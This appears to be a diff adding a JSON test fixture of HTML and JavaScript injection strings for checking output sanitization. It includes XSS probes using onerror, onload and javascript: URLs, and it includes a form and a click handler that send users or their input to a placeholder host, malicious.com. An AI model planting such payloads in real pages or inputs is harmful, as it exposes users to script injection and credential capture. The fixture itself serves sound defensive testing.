@@ -1,0 +1,12 @@
+[
+  { "text": "<b>Bold text</b> should look like plain text here.", "category": "injection", "tags": ["html"] },
+  { "text": "<img src=x onerror=alert(1)>", "category": "injection", "tags": ["html", "js"] },
+  { "text": "<iframe src='javascript:alert(\"XSS\")'></iframe>", "category": "injection", "tags": ["html", "js"] },
+  { "text": "<svg/onload=alert('XSS')>", "category": "injection", "tags": ["html", "js"] },
+  { "text": "javascript:alert('This should not execute')", "category": "injection", "tags": ["js"] },
+  { "text": "<body onload=alert('XSS')>", "category": "injection", "tags": ["html", "js"] },
+  { "text": "<div><p>Testing nested HTML tags</p></div>", "category": "injection", "tags": ["html"] },
+  { "text": "<style>body { background-color: red !important; }</style>", "category": "injection", "tags": ["html", "css"] },
+  { "text": "<form action='http://malicious.com'><input type='text' name='username'></form>", "category": "injection", "tags": ["html"] },
+  { "text": "<a href='#' onclick='document.location=\"http://malicious.com\"'>Click me</a>", "category": "injection", "tags": ["html", "js"] }
+]
